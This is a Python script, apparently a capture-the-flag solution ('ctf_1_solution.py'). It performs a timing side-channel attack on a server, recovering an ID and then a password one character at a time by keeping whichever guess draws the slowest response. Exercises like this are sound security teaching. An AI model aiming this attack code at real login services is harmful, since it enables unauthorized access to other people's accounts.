import socket
import sys
import time

def start_client(server_host, server_port):
    # Create a socket object
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the server
    client_socket.connect((server_host, server_port))


    message = client_socket.recv(1024).decode()
    print(message)
    # Receive and print the welcome message from the server
    
    password = ""
    max_time = 0
    max_char = ""
    done = False
    while True:
        for char in "1234567890-":
            t1 = time.time()
            client_socket.send((password + char).encode())
            print("Sent:", (password + char))
            message = client_socket.recv(1024).decode()
            
            t2 = time.time()
            if message.startswith("Server: Valid ID"):
                print(message)
                done = True
                final_ID = password + char
                break

            print(message)
            print(t2-t1)
            if t2-t1 > max_time:
                max_char = char
                max_time = t2-t1
            t1 = t2
        
        if done:
            break
        password += max_char
        max_time = 0
            
    print("Found ID:", final_ID)

    password = ""
    max_time = 0
    max_char = ""
    done = False
    while True:
        for char in "abcdefghijklmnopqrstuvwxyz":
            t1 = time.time()
            client_socket.send((password + char).encode())
            print("Sent:", (password + char))
            message = client_socket.recv(1024).decode()
            
            t2 = time.time()
            if message.startswith("Server: Valid Password"):
                print(message)
                done = True
                final_password = password + char
                break

            print(message)
            print(t2-t1)
            if t2-t1 > max_time:
                max_char = char
                max_time = t2-t1
            t1 = t2
        
        if done:
            break
        password += max_char
        max_time = 0
    print("Found ID:", final_ID)
    print("Found Password:", final_password)

    # Close the connection with the server
    client_socket.close()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python ctf_1_solution.py <server_host> <server_port>")
        sys.exit(1)

    server_host = sys.argv[1]
    server_port = int(sys.argv[2])

    start_client(server_host, server_port)
